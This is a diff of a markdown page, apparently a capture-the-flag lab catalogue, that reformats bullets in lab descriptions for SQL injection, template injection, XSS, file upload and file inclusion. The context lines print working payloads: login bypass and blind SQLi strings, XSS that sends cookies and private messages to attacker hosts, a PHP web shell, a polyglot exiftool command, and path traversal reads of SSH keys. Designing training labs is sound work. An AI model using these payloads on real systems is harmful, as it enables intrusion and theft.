@@ -12,12 +12,11 @@ icon: list-dropdown
 #### **Lab 1: The Classic Login Bypass (Easy)**
 
 * **Attack Type:** Union-Based or Authentication Bypass
-
-- **Level:** Easy
-- **Scenario:** A simple login page for a "Company Internal Portal". The user is told they are a new intern and need to get into the portal, but they don't have a password yet. The hint is: "What if you could trick the system into thinking you're someone you're not?"
-- **Where the Flag is Hidden:** The flag is returned on a successful login.\
+* **Level:** Easy
+* **Scenario:** A simple login page for a "Company Internal Portal". The user is told they are a new intern and need to get into the portal, but they don't have a password yet. The hint is: "What if you could trick the system into thinking you're someone you're not?"
+* **Where the Flag is Hidden:** The flag is returned on a successful login.\
   `RAZZ{l0g1n_6yp455}`
-- **How to Solve:**
+* **How to Solve:**
   1. Enter a classic payload in the username field: `' OR '1'='1' --`
   2. This comments out the password check and makes the query always true.
   3. The `UNION SELECT` technique can also be used to retrieve the flag directly if the number of columns is known.
@@ -68,9 +67,8 @@ icon: list-dropdown
 * **Attack Type:** Time-Based Blind
 * **Level:** Medium
 * **Scenario:** A "REST API Endpoint" for checking stock levels. It returns a simple JSON response: `{"in_stock": true}` or `{"in_stock": false}`. There is no other feedback. The goal is to extract the version of the database software.
-
-- **Where the Flag is Hidden:** The flag is the database version (e.g., `RAZZ{SQLite_3.45.1}`).
-- **How to Solve:**
+* **Where the Flag is Hidden:** The flag is the database version (e.g., `RAZZ{SQLite_3.45.1}`).
+* **How to Solve:**
   1. Since there is no visible error or data difference, the attacker must use a time delay.
   2. For SQLite, a payload like this is used: `product_id=' AND (CASE WHEN (SELECT substr(sqlite_version(),1,1)='3') THEN LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(300000000/2)))) ELSE 1 END) --`
   3. A more universal, simpler payload for testing might be: `product_id='; SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END --` (for PostgreSQL).
@@ -205,8 +203,7 @@ icon: list-dropdown
         "customer_name": "ignored"
       }
       ```
-  3. The response will include the rendered title, which contains the output of the command, exposing the `SECRET_KEY` (the flag).\
-
+  3. The response will include the rendered title, which contains the output of the command, exposing the `SECRET_KEY` (the flag).<br>
 
 #### Lab 3: CMS Page Rendering Engine (Medium)
 
@@ -236,9 +233,8 @@ icon: list-dropdown
 * **Attack Type:** SSTI with limited character set or filters
 * **Level:** Medium
 * **Scenario:** An application feature that generates PDF reports from templates. A common real-world example is **WeasyPrint** or **wkhtmltopdf** workflows where HTML templates are used. The user can control a "company name" field. The developer has filtered `{{` and `}}` to prevent SSTI.
-
-- **Where the Flag is Hidden:** The flag is the value of `settings.SECRET_KEY`.
-- **How to Solve:**
+* **Where the Flag is Hidden:** The flag is the value of `settings.SECRET_KEY`.
+* **How to Solve:**
   1. The attacker must bypass the filter. In Django templates, the `{%` and `%}` syntax can also be used for attacks, not just `{{` and `}}`.
   2. **Payload:** `company={% debug %}`
   3. The `{% debug %}` tag will output a massive amount of debugging information, including the entire context and the `SECRET_KEY` from the `settings` module. The attacker can then easily find the flag in the output.
@@ -250,9 +246,8 @@ icon: list-dropdown
 * **Attack Type:** Advanced SSTI (Sandbox Escape)
 * **Level:** Medium/Hard
 * **Scenario:** An "Email Template Editor" in a SaaS application (like **SendGrid, Mailchimp, or a custom CRM**). Users can create custom email templates using a limited set of template variables (`{{ user.name }}`). The application uses a sandboxed template environment, but it's misconfigured. The goal is to break out of the sandbox.
-
-- **Where the Flag is Hidden:** The flag is in the database, accessible only via a Django model: `AppSettings.objects.get().flag_value`.
-- **How to Solve:**
+* **Where the Flag is Hidden:** The flag is in the database, accessible only via a Django model: `AppSettings.objects.get().flag_value`.
+* **How to Solve:**
   1. This is a complex attack requiring research into the specific sandbox. The attacker must probe the environment to see what functions/classes are available.
   2. **Probing Payload:** `{{ ''.__class__ }}` - does it return `str` or is it blocked?
   3. If the sandbox is weak, standard Django SSTI payloads might work. If it's stronger, the attacker might need to abuse the `my_custom_lib` if it exposes dangerous functions, or find a flaw in the sandbox itself to access the underlying Python interpreter and import `os` or `subprocess` directly. Successfully doing so would allow them to run commands and exfiltrate the flag from the database.
@@ -268,9 +263,8 @@ icon: list-dropdown
 * **Attack Type:** Reflected XSS
 * **Level:** Easy
 * **Scenario:** A simple website with a search functionality. The search term is echoed back on the results page with the message "Results for: \[search term]". This is a classic reflected XSS scenario.
-
-- **Where the Flag is Hidden:** The flag is in the user's cookie (`document.cookie`). The goal is to steal it.
-- **How to Solve:**
+* **Where the Flag is Hidden:** The flag is in the user's cookie (`document.cookie`). The goal is to steal it.
+* **How to Solve:**
   1. The attacker crafts a URL with a malicious script as the search parameter.
   2. **Payload:** `http://vulnerable-site.com/search?q=<script>alert(document.cookie)</script>`
   3. When the victim clicks this link, the script executes in their browser, stealing their session cookie. The attacker would use a payload that sends the cookie to their own server: `<script>fetch('https://attacker-server.com/steal?cookie=' + document.cookie)</script>`.
@@ -282,9 +276,7 @@ icon: list-dropdown
 * **Attack Type:** Stored XSS
 * **Level:** Easy/Medium
 * **Scenario:** A blog platform that allows users to comment on posts. The comments are not sanitized properly and are stored in the database. Every time the blog post is viewed, the malicious comment is loaded and executed for all visitors. A real-world analogy is any forum or social media comment section with poor filtering
-
-- **Where the Flag is Hidden:** The flag is the content of a hidden HTML element only visible to authenticated users (`<div id="user-api-key">RAZZ{Stored_XSS_123}</div>`). The goal is to exfiltrate this data.
-
+* **Where the Flag is Hidden:** The flag is the content of a hidden HTML element only visible to authenticated users (`<div id="user-api-key">RAZZ{Stored_XSS_123}</div>`). The goal is to exfiltrate this data.
 * **How to Solve:**
   1. The attacker posts a comment containing a malicious script.
   2.  **Payload:**
@@ -306,9 +298,8 @@ icon: list-dropdown
 * **Attack Type:** DOM-Based XSS
 * **Level:** Medium
 * **Scenario:** A modern web app has a client-side theme switcher. The selected theme is read from the URL hash (e.g., `#theme=dark`) and written directly into the DOM using `innerHTML` without sanitization. This is a pure client-side vulnerability; the server is not involved.
-
-- **Where the Flag is Hidden:** The flag is in the browser's Local Storage (`localStorage.getItem('flag')`).
-- **How to Solve:**
+* **Where the Flag is Hidden:** The flag is in the browser's Local Storage (`localStorage.getItem('flag')`).
+* **How to Solve:**
   1. The attacker crafts a URL where the `theme` parameter is not a color, but a script.
   2. **Payload:** `http://vulnerable-site.com/theme#theme=red;</style><script>alert(localStorage.getItem('flag'))</script>`
   3. This payload first closes the `<style>` tag and then injects a new `<script>` tag. When the victim visits this URL, the malicious script executes, accessing Local Storage and exfiltrating the flag. The server never sees the payload; the attack happens entirely in the victim's browser.
@@ -320,9 +311,8 @@ icon: list-dropdown
 * **Attack Type:** Reflected XSS (Filter Bypass)
 * **Level:** Medium
 * **Scenario:** A "Contact Us" form. After submission, a thank you page displays the user's name. The developer implemented a naive filter that only blacklists the word `<script>`.
-
-- **Where the Flag is Hidden:** The flag is the value of a custom HTTP header (`X-Flag`) set by the server on this page.
-- **How to Solve:**
+* **Where the Flag is Hidden:** The flag is the value of a custom HTTP header (`X-Flag`) set by the server on this page.
+* **How to Solve:**
   1. The attacker must bypass the naive filter. There are many ways to execute JavaScript without a `<script>` tag (HTML tags with event handlers like `onerror`, `onload`, etc.).
   2. **Payload 1 (using img tag):** `name=<img src="x" onerror="alert('XSS')">`
   3. **Payload 2 (using iframe):** `name=<iframe onload="alert('XSS')"></iframe>`
@@ -376,8 +366,7 @@ icon: list-dropdown
       ```
       <img src="x" ng-on-error="fetch('/api/private-messages').then(r=>r.json()).then(data=>fetch('https://attacker.com/?='+btoa(JSON.stringify(data))))">
       ```
-  4. This complex payload uses AngularJS attributes (`ng-on-error`) to execute code if the image fails to load. It then reads the private messages and exfiltrates them to the attacker's server. This lab teaches advanced concepts of CSP bypass and the dangers of allowing any HTML tags.\
-
+  4. This complex payload uses AngularJS attributes (`ng-on-error`) to execute code if the image fails to load. It then reads the private messages and exfiltrates them to the attacker's server. This lab teaches advanced concepts of CSP bypass and the dangers of allowing any HTML tags.<br>
 
 </details>
 
@@ -390,9 +379,8 @@ icon: list-dropdown
 * **Attack Type:** unrestricted file upload
 * **Level:** Easy
 * **Scenario:** A social media profile page allows users to upload an avatar image. The application checks the _client-side_ `Content-Type` header but performs no further validation on the server. The files are stored in a web-accessible directory.
-
-- **Where the Flag is Hidden:** The flag is on the server's filesystem at `/home/django/flag.txt`.
-- **How to Solve:**
+* **Where the Flag is Hidden:** The flag is on the server's filesystem at `/home/django/flag.txt`.
+* **How to Solve:**
   1. The attacker creates a file named `shell.php` containing PHP code: `<?php system($_GET['cmd']); ?>`.
   2. They use a tool like Burp Suite to intercept the upload request and change the `Content-Type` header to `image/png`.
   3. The server accepts the file and saves it to the web root (e.g., `MEDIA_ROOT/`).
@@ -406,9 +394,8 @@ icon: list-dropdown
 * **Attack Type:** File upload with blacklist bypass
 * **Level:** Easy/Medium
 * **Scenario:** A document sharing service for a company intranet. The developer has implemented a blacklist of dangerous extensions (e.g., `.php`, `.py`, `.exe`). The goal is to bypass this list.
-
-- **Where the Flag is Hidden:** The flag is in the database, accessible via a Django command: `python manage.py get_flag`.
-- **How to Solve:**
+* **Where the Flag is Hidden:** The flag is in the database, accessible via a Django command: `python manage.py get_flag`.
+* **How to Solve:**
   1. The attacker must find an alternative extension that the server will still execute. For Apache servers, `.php5`, `.phtml`, `.phps` are common backups.
   2. **Payload:** Rename the `shell.php` file to `shell.phtml` and upload it.
   3. If the server is configured to execute `.phtml` as PHP, the web shell will work. The attacker can then use the shell to run the Django command: `python manage.py get_flag`.
@@ -420,9 +407,8 @@ icon: list-dropdown
 * **Attack Type:** File upload with type validation bypass
 * **Level:** Medium
 * **Scenario:** A meme generator site is stricter. It uses Python's `imghdr` or `filemagic` library to validate the file's _actual_ content, not just its extension or headers. It only allows genuine image files.
-
-- **Where the Flag is Hidden:** The flag is the SSH private key of the `django` user: `/home/django/.ssh/id_rsa`.
-- **How to Solve:**
+* **Where the Flag is Hidden:** The flag is the SSH private key of the `django` user: `/home/django/.ssh/id_rsa`.
+* **How to Solve:**
   1. The attacker must create a **polyglot file** a file that is both a valid JPEG and a valid PHP script.
   2. **Using `exiftool`:**\
      `exiftool -Comment='<?php system($_GET["cmd"]); ?>' legitimate_image.jpg`
@@ -437,9 +423,8 @@ icon: list-dropdown
 * **Attack Type:** Archive upload (Zip Slip) + Template overwrite
 * **Level:** Medium
 * **Scenario:** A website theme marketplace. Users can upload a `.zip` file containing HTML/CSS/JS templates for review. The application extracts the zip file on the server.
-
-- **Where the Flag is Hidden:** The goal is not to read a file but to achieve RCE. The flag is the output of the `id` command.
-- **How to Solve:**
+* **Where the Flag is Hidden:** The goal is not to read a file but to achieve RCE. The flag is the output of the `id` command.
+* **How to Solve:**
   1. The attacker creates a malicious zip file containing a file with a path traversal filename: `../../../../../../var/www/html/shell.php`.
   2. The content of `shell.php` is the standard web shell: `<?php system($_GET['cmd']); ?>`.
   3. When the application extracts the zip, the `../../` sequences cause the file to be written _outside_ the intended `extracted_themes` directory and into the main web root (`/var/www/html/`).
@@ -452,9 +437,8 @@ icon: list-dropdown
 * **Attack Type:** Time-of-Check Time-of-Use (TOCTOU) Race Condition
 * **Level:** Medium/Hard
 * **Scenario:** A secure document processing service boasts an advanced feature: all uploaded files are virus-scanned. If a file is found to be malicious, it is deleted. The application uses a popular antivirus CLI tool.
-
-- **Where the Flag is Hidden:** The flag is the output of the command `whoami` and `hostname`, proving execution context.
-- **How to Solve:**
+* **Where the Flag is Hidden:** The flag is the output of the command `whoami` and `hostname`, proving execution context.
+* **How to Solve:**
   1. The attacker uploads a web shell (e.g., `shell.php`).
   2. The server saves the file and immediately responds to the user.
   3. There is a 2-second window (or more, depending on server load) where the file exists on disk but hasn't been scanned and deleted yet.
@@ -481,9 +465,8 @@ icon: list-dropdown
 
 * **Vulnerabilities:** Local File Inclusion (LFI) via Path Traversal
 * **Scenario:** A "Help Center" page has a feature to display documentation for different product modules. The module name is taken from the URL parameter and included directly into the template.
-
-- **Where the Flag is Hidden:** The flag is in the Django application's secret configuration file: `/app/myproject/settings_secret.py`.
-- **How to Solve:**
+* **Where the Flag is Hidden:** The flag is in the Django application's secret configuration file: `/app/myproject/settings_secret.py`.
+* **How to Solve:**
   1. The attacker uses path traversal to escape the `help/` directory.
   2. **Payload:** `http://vulnerable-site.com/help?module=../../../../myproject/settings_secret%00`
   3. The `%00` (null byte) might be needed to cut off the `.html` extension if the server doesn't strip it automatically. Modern Django may be immune to null byte, so the attacker might need to find a way to read the file without the extension or use PHP filters if on a PHP server (this lab assumes a misconfiguremed setup or a similar pattern in another template engine). The key is the path traversal to include a non-template file
@@ -494,9 +477,8 @@ icon: list-dropdown
 
 * **Vulnerabilities:** Unrestricted File Download (Forced Download) + Path Traversal
 * **Scenario:** A simple view allows users to download their own uploaded files by filename. The code checks if the file exists in the upload directory but does not validate the filename for path traversal.
-
-- **Where the Flag is Hidden:** The flag is at `/var/backups/app.db`.
-- **How to Solve:**
+* **Where the Flag is Hidden:** The flag is at `/var/backups/app.db`.
+* **How to Solve:**
   1. The attacker uses path traversal to download any file on the system.
   2. **Payload:** `http://vulnerable-site.com/download?file=../../../../var/backups/app.db`
   3. The `os.path.join` creates the path `/opt/app/uploads/../../../../var/backups/app.db`, which normalizes to `/var/backups/app.db`.
@@ -509,9 +491,8 @@ icon: list-dropdown
 
 * **Vulnerabilities:** LFI escalated to RFI
 * **Scenario:** The application is running on a server with PHP (perhaps a legacy service). It has a standard LFI vulnerability. The PHP configuration has `allow_url_include` set to `On` (this is rare and unsafe, making it a good lab scenario).
-
-- **Where the Flag is Hidden:** The goal is RCE. The flag is on a remote server controlled by the attacker.
-- **How to Solve:**
+* **Where the Flag is Hidden:** The goal is RCE. The flag is on a remote server controlled by the attacker.
+* **How to Solve:**
   1. The attacker cannot directly do RFI because they control only part of the filename (`.php` is appended).
   2. They use a **PHP wrapper** to turn the LFI into an RFI. The `php://input` wrapper allows them to include the raw POST data as PHP code.
   3. **Step 1:** `http://vulnerable-php-site.com/index.php?page=php://input`
